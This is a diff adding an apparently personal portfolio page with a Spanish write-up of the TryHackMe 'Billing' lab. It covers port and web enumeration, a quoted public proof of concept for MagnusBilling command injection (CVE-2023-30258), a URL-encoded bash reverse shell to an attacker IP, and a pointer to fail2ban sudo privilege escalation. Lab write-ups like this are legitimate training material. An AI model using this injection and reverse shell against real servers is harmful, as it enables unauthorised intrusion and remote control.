@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Billing | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../../../index.html#writeups" class="nav-link">← Writeups</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../../../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <div class="writeup-meta">
+        <span class="card-badge thm">THM</span>
+        <span class="card-difficulty easy">EASY</span>
+      </div>
+      <h1 class="writeup-title">Billing</h1>
+      <div class="writeup-info">
+        <span>Plataforma: <strong style="color:var(--blue-bright)">TryHackMe</strong></span>
+        <span>Tags: <span>MagnusBilling</span><span>RCE</span><span>Sudo</span></span>
+      </div>
+    </div>
+    <div class="writeup-body">
+
+<h1>Enumeración</h1>
+
+<h2>Enumeración de puertos </h2>
+
+<p>comando nmap: <code>nmap -sS -p- --open --min-rate 5000 -Pn -n 10.10.151.126 -oN nmap</code></p>
+
+<pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 17:06 EDT
+<p>Nmap scan report for 10.10.151.126</p>
+<p>Host is up (1.5s latency).</p>
+<p>Not shown: 47083 filtered tcp ports (no-response), 18449 closed tcp ports (reset)</p>
+<p>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</p>
+<p>PORT     STATE SERVICE</p>
+<p>22/tcp   open  ssh</p>
+<p>80/tcp   open  http</p>
+<p>3306/tcp open  mysql</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 27.28 seconds</code></pre></p>
+<p>vemos que estan los puertos 22,80 y 3306 abiertos.</p>
+
+<hr>
+
+<h1>Enumeración Servidor Web</h1>
+
+
+<em>[imagen]</em>
+<p>vemos un panel login en el que probamos SQLi pero no funciona.</p>
+
+<hr>
+
+<h2>Fuzzing Web </h2>
+
+<p>Comando: <code>gobuster dir -u http://10.10.151.126 -w /usr/share/seclists/Discovery/Web-(Content/directory-list-2.3-big.txt </code></p>
+
+<p>no descrimos nada bueno</p>
+
+<hr>
+
+<h2>Exploit (MagnusBilling Command Injection CVE-2023-30258)</h2>
+
+<p>Investigando un poco del sistema</p>
+
+
+<p>MagnusBilling es un sistema <strong>open-source</strong> de facturación ("billing") y gestión para proveedores de telefonía IP (VoIP) que se basa en Asterisk (y tecnologías relacionadas). [MagnusBilling Wiki+2MagnusBilling+2](https://wiki.magnusbilling.org/en/source/intro.html?utm_source=chatgpt.com)</p>
+
+<p>En sus propias palabras:</p>
+
+<p>MagnusBilling es una herramienta completa y potente para cualquier persona que quiera comenzar como proveedor de telefonía IP en cuestión de minutos.</p>
+
+<p>Descubrimos que hay un CVE publico para este sistema opensource:</p>
+<pre><code># Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection
+<h1>Date: 2024-10-26</h1>
+<h1>Exploit Author: CodeSecLab</h1>
+<h1>Vendor Homepage: https://github.com/magnussolution/magnusbilling7</h1>
+<h1>Software Link: https://github.com/magnussolution/magnusbilling7</h1>
+<h1>Version: 7.3.0 </h1>
+<h1>Tested on: Centos</h1>
+<h1>CVE : CVE-2023-30258</h1>
+
+
+<h1>PoC URL for Command Injection</h1>
+
+<p>http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt</p>
+
+<p>Result: This PoC attempts to inject the id command.</p>
+
+<p>[Replace Your Domain Name]</code></pre></p>
+<p>Como podemos ver hay un ruta a un endpoint php que nos permite ejecutar comando, aprovechamos esto para establecer una reverse shell</p>
+<code>bash -c "bash -i >%26 %2Fdev%2Ftcp%2F10.8.158.4%2F4444 0>%261"; echo</code>
+<p>y ya obtenemos la intrusión inicial</p>
+
+<p>vemos el archivo donde ocurre la vuln para entenderla mejor y vemos que <code>exec()</code> ejecuta todo lo que enviemos por el parámetro <strong>democ</strong></p>
+<em>[imagen]</em>
+
+<em>[imagen]</em>
+
+<hr>
+
+<h1>Escalada de Privilegios</h1>
+<em>[imagen]</em>
+<p>vemos que no somos el típico usuario <code><code>www-data</code></code></p>
+
+<p>hacemos <code>sudo -l</code> para ver que permisos sudoers tenemos y vemos que podemos ejecutar el comando <code>fail2ban</code> como root , investigando vemos que podemos escalar privilegios con esto</p>
+<p>https://juggernaut-sec.com/fail2ban-lpe/</p>
+
+    </div>
+  </div>
+</body>
+</html>
